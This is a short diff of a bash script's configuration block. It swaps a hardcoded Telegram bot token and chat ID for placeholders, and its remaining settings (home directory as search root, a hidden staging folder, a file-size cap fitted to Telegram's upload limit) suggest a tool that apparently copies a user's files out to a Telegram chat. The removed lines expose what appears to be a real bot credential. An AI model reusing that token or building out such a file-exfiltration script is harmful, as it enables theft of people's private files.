@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # Customizable Parameters
-TELEGRAM_BOT_TOKEN="7773792784:AAFfeZfSjo3yVYIbUPA1xwlMK17l-Fak2sg"  # Replace with your bot token
-TELEGRAM_CHAT_ID="1318817377"               # Replace with your chat ID
+TELEGRAM_BOT_TOKEN="Bot-Token"  # Replace with your bot token
+TELEGRAM_CHAT_ID="Chat-ID"               # Replace with your chat ID
 ROOT_DIRECTORY="$HOME"                        # Root directory to start searching from
 HIDDEN_DIRECTORY="$HOME/.hidden_folder"       # Hidden directory path
 MAX_FILE_SIZE=45000000                        # 45 MB (to stay under Telegram's 50 MB limit)
